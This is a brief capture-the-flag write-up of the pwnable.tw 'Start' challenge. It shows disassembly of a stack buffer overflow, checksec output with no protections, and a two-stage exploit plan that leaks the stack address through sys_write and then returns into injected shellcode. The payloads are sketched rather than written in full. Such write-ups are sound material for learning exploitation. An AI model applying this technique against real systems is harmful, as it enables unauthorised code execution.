# Pwnable.tw Start #  
from ida:

    .text:08048093                 mov     dl, 3Ch
	.text:08048095                 mov     al, 3
	.text:08048097                 int     80h             ; LINUX -
	.text:08048099                 add     esp, 14h
	.text:0804809C                 retn

The length of input can be 0x3C but the buffer is only 0x14 in length.
Based on the following checksec:  

    [*] '/mnt/hgfs/kali32/pwnable.tw/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)

no protection, and the file is statically linked, so I'll use shellcode.

find a shellcode with proper length.

The only writeable area is stack. And the stack address can be leaked by using syscall write.  

    .text:08048087                 mov     ecx, esp        ; addr
	.text:08048089                 mov     dl, 14h         ; len
	.text:0804808B                 mov     bl, 1           ; fd
	.text:0804808D                 mov     al, 4
	.text:0804808F                 int     80h             ;

When return to sys_write in the text,the prog will execute sys_read again.  

So  
payload1 = padding + ret_addr(write)

then  we  can get the information of the saved esp.

payload2 = paddding + ret_addr(saved_esp+0x14)+shellcode   
